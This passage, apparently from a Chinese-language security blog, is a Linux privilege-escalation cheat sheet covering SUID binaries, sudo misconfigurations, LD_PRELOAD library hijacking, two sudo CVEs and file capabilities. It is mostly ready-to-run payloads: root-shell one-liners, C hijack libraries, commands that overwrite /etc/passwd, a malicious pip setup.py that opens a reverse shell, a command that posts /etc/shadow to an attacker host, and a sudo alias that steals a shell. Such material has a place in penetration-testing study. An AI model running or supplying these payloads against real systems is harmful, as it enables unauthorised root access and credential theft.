<h4 id="第二种有绝对路径的service"><a href="#第二种有绝对路径的service" class="headerlink" title="第二种有绝对路径的service"></a>第二种有绝对路径的service</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function /usr/sbin/service() &#123; cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; &#125;export -f /usr/sbin/service/usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +s /tmp/bash)&#x27; /bin/sh -c &#x27;/usr/local/bin/suid-env2; set +x; /tmp/bash -p&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="suid-xxd"><a href="#suid-xxd" class="headerlink" title="suid xxd"></a>suid xxd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd &#x27;/etc/shadow&#x27; | xxd -r</span><br></pre></td></tr></table></figure>

<h3 id="suid-taskset"><a href="#suid-taskset" class="headerlink" title="suid taskset"></a>suid taskset</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskset 1 /bin/sh -p</span><br></pre></td></tr></table></figure>

<h3 id="suid-cp"><a href="#suid-cp" class="headerlink" title="suid cp"></a>suid cp</h3><p>如果遇到suid位的cp，则可以利用&#x2F;etc&#x2F;passwd创建一个等同与root用户的账号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd &gt;&gt; /tmp/passwd   ##此时的/tmp/passwd权限位当前用户应该是可写的openssl passwd -1 -salt abc 123echo &#x27;abc:$1$abc$98/EDagBiz63dxD3fhRFk1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /tmp/passwdcp /tmp/passwd /etc/passwdsu abc</span><br></pre></td></tr></table></figure>


<h2 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h2><p><code>sudo -l</code><br>这个命令可以列出当前用户可以使用超级用户的什么命令。<br>如果目标可以执行sudo vi的话。<br>可以再打开vim之后 使用:!sh 来打开一个shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@123~]# whoamiroot</span><br></pre></td></tr></table></figure>

<p>或者不打开vim，直接使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c &#x27;!sh&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="sudo-nmap"><a href="#sudo-nmap" class="headerlink" title="sudo nmap"></a>sudo nmap</h3><h4 id="nmap-2-02-5-21"><a href="#nmap-2-02-5-21" class="headerlink" title="nmap 2.02 - 5.21"></a>nmap 2.02 - 5.21</h4><p>可以打开交互界面提权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactivenmap&gt;!sh</span><br></pre></td></tr></table></figure>

<h4 id="nmap-脚本提权"><a href="#nmap-脚本提权" class="headerlink" title="nmap 脚本提权"></a>nmap 脚本提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TFsudo nmap --script=$TF</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse</span><br></pre></td></tr></table></figure>

<h3 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h3><h4 id="动态连接共享库提权"><a href="#动态连接共享库提权" class="headerlink" title="动态连接共享库提权"></a>动态连接共享库提权</h4><p>这个是利用动态链接共享对象库提权</p>
<a href="https://cloud.tencent.com/developer/article/1038337" title="" target="">动态链接共享对象库提权</a>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.csudo LD_PRELOAD=/tmp/preload.so program-name-here</span><br></pre></td></tr></table></figure>

<p>此时应该也会生成一个root_shell了</p>
<figure class="highlight c"><figcaption><span>preload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.csudo LD_LIBRARY_PATH=/tmp apache2</span><br></pre></td></tr></table></figure>

<p>此时应该也会生成一个root_shell了。</p>
<figure class="highlight c"><figcaption><span>library_path.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hijack</span><span class="params">()</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack</span><span class="params">()</span> &#123;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>);</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="滥用预期功能"><a href="#滥用预期功能" class="headerlink" title="滥用预期功能"></a>滥用预期功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure>

<p>爆破就完事了…</p>
<h3 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h3><p>find 命令有一个参数可以执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /bin -name nano -exec /bin/sh \;</span><br></pre></td></tr></table></figure>


<h3 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="sudo-zip"><a href="#sudo-zip" class="headerlink" title="sudo zip"></a>sudo zip</h3><p>要求sudo配置如下</p>
<ul>
<li><code>&lt;user&gt; ALL=(ALL) NOPASSWD: /usr/bin/zip</code>(不是一定要这样,只要能sudo执行zip就可以了)</li>
</ul>
<p>可以这样利用:</p>
<figure class="highlight shell"><figcaption><span>GTFOBins-zip</span><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/zip/">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -u)</span><br><span class="line">sudo zip $TF /etc/hosts -T -TT &#x27;sh #&#x27;</span><br><span class="line">sudo rm $TF</span><br></pre></td></tr></table></figure>

<p>也可以:</p>
<figure class="highlight shell"><figcaption><span>类Unix系统上使用zip命令进行本地提权</span><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/206007.html">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch raj.txt</span><br><span class="line">zip 1.zip raj.txt -T --unzip-command=&quot;sh -c sh&quot;</span><br></pre></td></tr></table></figure>

<p>不过有可能会有些机器不支持<code>unzip-command</code>模块，会报这样的错误。</p>
<blockquote><p>$ sudo -u jsmith zip 1.zip 1.txt -T –unzip-conmmand&#x3D;’sh -c sh’</p>
<p>zip error: Invalid command arguments (long option ‘unzip-conmmand’ not supported)</p>
</blockquote>

<h3 id="sudo-tar"><a href="#sudo-tar" class="headerlink" title="sudo tar"></a>sudo tar</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure>

<p>或者是执行一个perl反弹shell的脚本。</p>
<h3 id="sudo-vi-x2F-vim"><a href="#sudo-vi-x2F-vim" class="headerlink" title="sudo vi&#x2F;vim"></a>sudo vi&#x2F;vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c &#x27;:!/bin/bash&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h3><p>先msfvenom生成一个jar的木马上传到目标机器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -jar your_muma_name.jar</span><br></pre></td></tr></table></figure>

<h3 id="sudo-man"><a href="#sudo-man" class="headerlink" title="sudo man"></a>sudo man</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo man man!/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="sudo-wget"><a href="#sudo-wget" class="headerlink" title="sudo wget"></a>sudo wget</h3><p>法一</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#攻击者执行nc -lvnp 80 &gt; hash#目标执行sudo wget --post-file /etc/shadow hacker-ip#攻击者执行john hash --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>

<p>法二</p>
<p><strong>先获取目标的&#x2F;etc&#x2F;passwd，并往里面添加一个uid为0密码123的权限用户，假设用户名为abc。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#攻击者执行python -m http.server 80#目标执行sudo wget -O /etc/passwd hacker-ip/passwdsu abc or ssh abc@2.2.2.2</span><br></pre></td></tr></table></figure>

<p>如果目标系统上有以root身份运行的脚本，可以在攻击机本地新建一个同名的，并追加恶意脚本内容，目标环境用wget下载-O另存为一个新文件的方式来覆盖掉。</p>
<h3 id="sudo-yum"><a href="#sudo-yum" class="headerlink" title="sudo yum"></a>sudo yum</h3><p>没有fpm环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)<span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/x&lt;&lt;<span class="string">EOF[main]plugins=1pluginpath=$TFpluginconfpath=$TFEOFcat &gt;$TF/y.conf&lt;&lt;EOF</span>[main]enabled=1EOFcat &gt;<span class="variable">$TF</span>/y.py&lt;&lt;<span class="string">EOFimport osimport yumfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVErequires_api_version=&#x27;2.1&#x27;def init_hook(conduit):os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)EOFsudo yum -c $TF/x --enableplugin=y</span></span><br></pre></td></tr></table></figure>

<p>有fpm环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)<span class="built_in">echo</span> <span class="string">&#x27;id&#x27;</span> &gt; <span class="variable">$TF</span>/x.shfpm -n x -s <span class="built_in">dir</span> -t rpm -a all --before-install <span class="variable">$TF</span>/x.sh <span class="variable">$TFsudo</span> yum localinstall -y x-1.0-1.noarch.rpm</span><br></pre></td></tr></table></figure>

<h3 id="sudo-pkexec"><a href="#sudo-pkexec" class="headerlink" title="sudo pkexec"></a>sudo pkexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pkexec --user root /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="sudo-systemctl"><a href="#sudo-systemctl" class="headerlink" title="sudo systemctl"></a>sudo systemctl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl!sh</span><br></pre></td></tr></table></figure>

<p>创建一个服务的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp).serviceecho &#x27;[Service]Type=oneshotExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;[Install]WantedBy=multi-user.target&#x27; &gt; $TFsudo systemctl link $TFsudo systemctl enable --now $TF</span><br></pre></td></tr></table></figure>

<h3 id="sudo-journalctl"><a href="#sudo-journalctl" class="headerlink" title="sudo journalctl"></a>sudo journalctl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl!/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="sudo-strace"><a href="#sudo-strace" class="headerlink" title="sudo strace"></a>sudo strace</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -o /dev/null /bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="sudo-taskset"><a href="#sudo-taskset" class="headerlink" title="sudo taskset"></a>sudo taskset</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo taskset 1 /bin/sh -p</span><br></pre></td></tr></table></figure>

<h3 id="sudo-pip-x2F-pip3"><a href="#sudo-pip-x2F-pip3" class="headerlink" title="sudo pip&#x2F;pip3"></a>sudo pip&#x2F;pip3</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>

<p>如果直接利用不行，那就是试试先打开一个python pty，再尝试利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>

<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>安装恶意setup.py脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from setuptools </span><br><span class="line">import setup from setuptools.command.install </span><br><span class="line">import install</span><br><span class="line">import os, socket, subprocess</span><br><span class="line">class CustomInstall(install):  </span><br><span class="line">	def run(self):    </span><br><span class="line">		install.run(self)    </span><br><span class="line">		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    </span><br><span class="line">		s.connect((&quot;127.0.0.1&quot;,1234))    </span><br><span class="line">		os.dup2(s.fileno(),0)    </span><br><span class="line">		os.dup2(s.fileno(),1)    </span><br><span class="line">		os.dup2(s.fileno(),2)    </span><br><span class="line">		p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br><span class="line">		setup(name=&#x27;FakePip&#x27;,      version=&#x27;0.0.1&#x27;,      description=&#x27;Reverse shell&#x27;,      url=&#x27;xx.xx.xx.xx&#x27;,      author=&#x27;nathan&#x27;,      author_email=&#x27;xx@xx&#x27;,      license=&#x27;MIT&#x27;,      zip_safe=False,      cmdclass=&#123;&#x27;install&#x27;: CustomInstall&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>

<h3 id="sudo-CVE-2019-14287-提权"><a href="#sudo-CVE-2019-14287-提权" class="headerlink" title="sudo CVE-2019-14287 提权"></a>sudo CVE-2019-14287 提权</h3><p>要求</p>
<ul>
<li>sudo版本低于v1.8.28</li>
<li>&#x2F;etc&#x2F;sudoers 配置要求如下(要求一组特定权限)<ul>
<li><code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code></li>
</ul>
</li>
</ul>
<p><code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code>代表该用户能以<strong>非root</strong>的身份运行所有命令</p>
<p>注意:<strong>root的uid永远为0</strong></p>
<p>使用这个漏洞之前,我们需要知道sudo的一个参数<code>-u</code></p>
<p><code>sudo -u#0 &lt;command&gt;</code></p>
<p>即以uid为0的用户去运行这个命令.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u#0 whoami[sudo] password for abc:root$ sudo -u#1 whoamibin</span><br></pre></td></tr></table></figure>

<p>那么如果我们输入一个uid位为无符号的整型的时候会怎么样呢??</p>
<p><code>sudo -u#-1 whoami</code></p>
<details>
<summary>答案</summary>
<pre><code>


<p><img src="https://images.atsud0.me/images/post/Screenshot_20200511_110433.jpg" alt="sd"><br>如果目标机器的sudo版本以及拥有特定权限都满足以上条件,那么你就能获得root权限.</p>
<p>Sudo会错误地将<code>-1</code>或者<code>4294967295</code>读取为0（即root）。 这意味着通过将UID指定为<code>-1</code>或<code>4294967295</code>，就能以root身份执行命令</p>
<p>再次提醒:您需要sudo版本以及拥有非root sudo权限的情况下,才能起作用.否则毫无价值.<br></code></pre></p>
</details>

<h3 id="sudo-CVE-2019-18634-提权"><a href="#sudo-CVE-2019-18634-提权" class="headerlink" title="sudo CVE-2019-18634 提权"></a>sudo CVE-2019-18634 提权</h3><p>sudo版本要求</p>
<ul>
<li>sudo版本低于1.8.26</li>
<li>sudo配置开启<code>pwfeedback</code></li>
</ul>
<p>这与<code>CVE-2019-14287</code>的不同之处在于,<code>CVE-2019-14287</code>要求特定的权限,而<code>CVE-2019-18634</code>不需要任何特定的权限,即使是未在sudoers文件中列出的用户也可利用此漏洞。</p>
<p><code>CVE-2019-18634</code> 使用到了缓冲区溢出攻击(Buffer Overflow)</p>
<p><code>pwfeedback</code>选项是可让用户在输入密码时提供可视化的反馈（辅助输入）。</p>
<p><code>pwfeedback</code> 在Linux Mint和 elementary OS 默认开启,但在其他系统就不是了.需要管理员开启才能生效</p>
<blockquote>
<p>Sudo的开发者Todd C. Miller表示，利用此漏洞和sudo权限无关，只需要启用了pwfeedback即可。</p>
</blockquote>
<p>当sudo提示输入密码时，可以通过管道符将大量输入传递给sudo，从而重现漏洞，例如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &#x27;print((&quot;A&quot; x 100 . &quot;\x&#123;00&#125;&quot;) x 50)&#x27; | sudo -S idPassword: Segmentation fault</span><br></pre></td></tr></table></figure>

<p>在这个命令中，我们使用Perl生成大量无用字符，然后使用管道符将这些字符作为密码传递给sudo命令。</p>
<p>但是这实际上并没有给我们root权限，相反，它向我们显示了一个错误消息:Segmentation fault，这基本上意味着我们试图访问一些我们不应该访问的内存。这证明了缓冲区溢出漏洞的存在:现在我们只需要利用它</p>
<p>exp作者:<a target="_blank" rel="noopener" href="https://github.com/saleemrashid/sudo-cve-2019-18634">saleemrashid</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.cgcc -o exploit exploit.c./exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/CVE-2019-18634-Demo-1.png" alt="cve-2019-18634"></p>
<p>漏洞出现的原因有两个：</p>
<ul>
<li><p>当从终端设备以外的设备读取数据时，pwfeedback选项不会被忽略。由于缺少终端，已保存的行擦除字符的版本保持其初始值0。</p>
</li>
<li><p>如果出现写错误，擦除星号行的代码就无法正确地重置缓冲区位置，但是会重置剩余的缓冲区长度。因此，getln()函数可以写入缓冲区的末尾。</p>
</li>
</ul>
<h3 id="sudo-LD-PRELOAD环境变量提权"><a href="#sudo-LD-PRELOAD环境变量提权" class="headerlink" title="sudo LD_PRELOAD环境变量提权"></a>sudo LD_PRELOAD环境变量提权</h3><blockquote>
<p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件&#x2F;etc&#x2F;ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和&#x2F;etc&#x2F;ld.so.preload配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。<br><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-01-01/1">Linux权限维持之LD_PRELOAD</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() &#123;    unsetenv(&quot;LD_PRELOAD&quot;);    setgid(0);    setuid(0);    system(&quot;/bin/bash&quot;);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o /tmp/x.so x.c -nostartfilessudo LD_PRELOAD=/tmp/x.so apache2</span><br></pre></td></tr></table></figure>

<h3 id="记一个比较秀的sudo提权"><a href="#记一个比较秀的sudo提权" class="headerlink" title="记一个比较秀的sudo提权"></a>记一个比较秀的sudo提权</h3><p><a target="_blank" rel="noopener" href="https://redd.it/hn6vy5">Why does .bashrc have write access by non-root users by default?</a></p>
<blockquote>
<p>Why does .bashrc have write access by non-root users by default?<br>I am not really sure if there is any non-malicious use cases where ~&#x2F;.bashrc needs to be writable without root. Anyone with write access to .bashrc can make an alias like<br>alias sudo&#x3D;’sudo BAD_COMMAND; sudo’<br>Wouldn’t it make more sense to make bashrc harder to write to?</p>
</blockquote>
<p>如果你拿到了一个非root,但是又拥有sudo权限的用户的shell.而你不知道该用户的密码,可以这样提权.</p>
<p>修改该用户的shell的配置文件,添加一个别名sudo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias sudo =&#x27;sudo nc -nv IP PORT 2&gt;/dev/null &amp;;sudo&#x27;</span><br></pre></td></tr></table></figure>

<p>监听端口,等待用户上线后sudo命令输入密码获得shell.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200708_151735.jpg"></p>
<h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1529342">Capabilities</a></p>
<blockquote>
<p>Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID&#x3D;0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。<br>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。</p>
</blockquote>
<h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><ul>
<li>getcap</li>
<li>setcap</li>
<li>capsh</li>
<li>filecap</li>
</ul>
<p>这些命令来自libcap和labcap-ng包。如名字一样，get用于查询，set用于设置，capsh则用于查当前shell进程的capabilities，filecap既能设置也能查询。</p>
<h3 id="查找设置了Capabilities的可执行文件"><a href="#查找设置了Capabilities的可执行文件" class="headerlink" title="查找设置了Capabilities的可执行文件"></a>查找设置了Capabilities的可执行文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx -ex <span class="string">&#x27;python import os; os.setuid(0)&#x27;</span> -ex <span class="string">&#x27;!sh&#x27;</span> -ex quit</span><br></pre></td></tr></table></figure>

<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;posix_setuid(0); system(&#x27;/bin/sh&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="rvim"><a href="#rvim" class="headerlink" title="rvim"></a>rvim</h3><p>需要支持python3模块。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rvim -c <span class="string">&#x27;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

